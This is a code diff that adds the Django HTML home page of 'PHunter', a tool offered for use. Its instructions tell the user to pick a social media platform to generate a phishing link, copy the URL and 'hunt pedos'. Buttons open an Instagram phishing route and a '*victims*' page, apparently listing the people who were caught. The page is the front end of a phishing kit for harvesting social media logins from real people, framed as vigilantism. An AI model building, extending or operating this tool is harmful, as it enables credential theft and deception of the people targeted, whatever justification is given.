@@ -1,0 +1,44 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PHunter</title>
+  <link rel="stylesheet" href="{% static 'home/styles.css' %}">
+</head>
+<body>
+  <pre>
+██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
+██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
+██████╔╝███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
+██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
+██║     ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+
+<p>
+instructions :
+
+<ol>
+<li>Click the social media platform you want to generate a phishing link for</li>
+<li>Copy the URL</li>
+<li>Hunt pedos</li>
+</ol> 
+</p>
+  </pre>
+
+  <button class="button" onclick="openInstagramWindow(); return false;">Instagram</button>
+
+  <!-- Victims Button -->
+  <button class="button" onclick="openVictimsWindow(); return false;">*victims*</button>
+
+  <script>
+    function openInstagramWindow() {
+      window.open('/instagram/', 'instagramWindow', 'width=900,height=600,resizable=yes,scrollbars=yes');
+    }
+
+    function openVictimsWindow() {
+      window.open('/victims/', 'victimsWindow', 'width=900,height=600,resizable=yes,scrollbars=yes');
+    }
+  </script>
+</body>
+</html>
